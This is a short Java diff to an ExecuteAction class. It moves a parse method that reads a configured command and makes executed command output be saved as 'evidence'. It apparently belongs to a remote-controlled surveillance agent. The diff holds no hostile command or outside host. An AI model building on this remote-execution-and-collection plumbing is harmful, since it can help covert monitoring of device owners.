@@ -55,6 +55,29 @@ public class ExecuteAction extends SubActionSlow {
 		super(params);
 	}
 
+	@Override
+	protected boolean parse(final ConfAction params) {
+		try {
+			this.command = Directory.expandMacro(params.getString("command"));			
+	
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (parse): " + this.command);
+			}
+		} catch (final ConfigurationException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+	
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error: params FAILED");
+			}
+	
+			return false;
+		}
+	
+		return true;
+	}
+
 	/*
 	 * (non-Javadoc)
 	 * 
@@ -69,9 +92,7 @@ public class ExecuteAction extends SubActionSlow {
 			Check.log(TAG + " (execute): " + command);
 		}
 		ExecuteResult ret = Execute.execute(this.command);
-		
-		/*Evidence evidence = new Evidence(EvidenceType.COMMAND);
-		evidence.atomicWriteOnce(WChar.pascalize(ret.getStdout()));*/
+		ret.saveEvidence();
 		
 		return ret.exitCode == 0;
 	}
@@ -168,28 +189,5 @@ public class ExecuteAction extends SubActionSlow {
 		}
 
 		return false;
-	}
-
-	@Override
-	protected boolean parse(final ConfAction params) {
-		try {
-			this.command = Directory.expandMacro(params.getString("command"));			
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (parse): " + this.command);
-			}
-		} catch (final ConfigurationException e) {
-			if (Cfg.EXCEPTION) {
-				Check.log(e);
-			}
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: params FAILED");
-			}
-
-			return false;
-		}
-
-		return true;
 	}
 }
